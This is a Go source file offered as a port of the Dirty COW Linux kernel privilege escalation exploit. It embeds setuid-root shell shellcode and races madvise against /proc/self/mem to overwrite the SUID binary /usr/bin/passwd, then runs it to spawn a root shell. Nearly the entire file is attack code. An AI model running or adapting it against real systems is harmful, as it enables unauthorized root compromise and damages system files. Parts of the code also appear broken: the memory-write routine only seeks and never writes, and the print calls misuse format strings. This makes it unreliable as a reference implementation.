/*

Dirty Cow exploit ported from C into Go, OG reqrite
inspired by the original dirty cow exploit for

 ___________________________________
< Local Privlege Escalation Exploit >
 -----------------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||


OG C file -> dirty_cow.c

ArkAngeL43 OR ANY OTHER DEVELOPERS FOR RR5 CLAIM ANY MAIN OWNERSHIP
FOR DIRTY_COW.c


*/

package main

import (
	"bytes"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"syscall"
	"time"
)

var standard = []byte{
	0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
	0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xb1, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xea, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x48, 0x31, 0xff, 0x6a, 0x69, 0x58, 0x0f, 0x05, 0x6a, 0x3b, 0x58, 0x99,
	0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x53, 0x48,
	0x89, 0xe7, 0x68, 0x2d, 0x63, 0x00, 0x00, 0x48, 0x89, 0xe6, 0x52, 0xe8,
	0x0a, 0x00, 0x00, 0x00, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73,
	0x68, 0x00, 0x56, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05,
}

var (
	proc               = "/proc/self/mem"
	banner             = "cow.txt"
	map_main           uintptr
	os_sig             = make(chan bool, 2)
	set_payload_custom = flag.String("binf", "", "set standard exploit")
)

const (
	SUID_BIN = "/usr/bin/passwd"
)

func banner_main(file string) {
	content, err := ioutil.ReadFile(file)
	if err != nil {
		log.Fatal(err)
	} else {
		fmt.Println("\033[31m", string(content))
	}

}

func error_check(err error, check_err_code int, msg string) bool {
	if err != nil {
		if msg == "" {
			fmt.Println(err, "ERROR FEILD EMPTY STANDARD ERROR UNKNOWN")
			os.Exit(1)
			return true
		} else {
			log.Fatal(msg, err)
			return true
		}
	}
	return false
}

func mad_vise() {
	for i := 0; i < 1000000; i++ {
		select {
		case <-os_sig:
			fmt.Println("\033[35m[+] MAD VISE Finished!")
			return

		default:
			syscall.Syscall(syscall.SYS_MADVISE, map_main, uintptr(100), syscall.MADV_DONTNEED)
		}
	}
}

func proc_memory(payload []byte) {
	open_proc, err := os.OpenFile(proc, syscall.O_RDWR, 0)
	error_check(err, 1, "\033[31m[!] COULD NOT OPEN PROC ")
	for i := 0; i < 1000000; i++ {
		select {
		case <-os_sig:
			fmt.Println("\033[35m[+] Proc Self mem Finished!")
			return
		default:
			syscall.Syscall(syscall.SYS_LSEEK, open_proc.Fd(), map_main, uintptr(os.SEEK_SET))
		}
	}
}

func write_wait() {
	buffer := make([]byte, len(standard))
	for {
		file, err := os.Open(SUID_BIN)
		error_check(err, 1, "ERROR OPENING BIN ")
		if _, err := file.Read(buffer); err != nil {
			panic(err)
		}
		file.Close()
		//
		if bytes.Compare(buffer, standard) == 0 {
			fmt.Println("[!] %s has been over written\n", SUID_BIN)
			break
		}
		time.Sleep(1 * time.Second)
	}
	os_sig <- true
	os_sig <- true
	fmt.Println("\033[32m[+] Popping R00T shell")
	fmt.Println("\033[31m[!] Do NOT forget to restore /tmp/bak\n")
	attr := os.ProcAttr{
		Files: []*os.File{os.Stdin, os.Stdout, os.Stderr},
	}
	proc, err := os.StartProcess(SUID_BIN, nil, &attr)
	error_check(err, 1, "ERROR DURING OS EXECUTION START PROCESS")
	proc.Wait()
	os.Exit(0)
}

func attack_main() {
	fmt.Println("[ WARN ] Backing up %s to new directory => /tmp/bak", SUID_BIN)
	backup_SUID := exec.Command("cp", SUID_BIN, "/tmp/bak")
	if err := backup_SUID.Run(); err != nil {
		log.Fatal(err)
	}
	file, err := os.OpenFile(SUID_BIN, os.O_RDONLY, 0600)
	error_check(err, 1, "[!] could not open SUID BINARY FILE")
	state, err_stat := file.Stat()
	error_check(err_stat, 1, "[!] COULD NOT GET STAT OF FILE ")
	fmt.Println("[+] Current size of binary -> %d", state.Size())
	payload_main := make([]byte, state.Size())
	for i, _ := range payload_main {
		payload_main[i] = 0x90
	}
	for i, v := range standard {
		payload_main[i] = v
	}
	map_main, _, _ = syscall.Syscall6(
		syscall.SYS_MMAP,
		uintptr(0),
		uintptr(state.Size()),
		uintptr(syscall.PROT_READ),
		uintptr(syscall.MAP_PRIVATE),
		file.Fd(),
		0,
	)
	fmt.Println("Racing, this may take a while..\n")
	go mad_vise()
	go proc_memory(payload_main)
	write_wait()
}

func main() {
	banner_main(banner)
	attack_main()
}
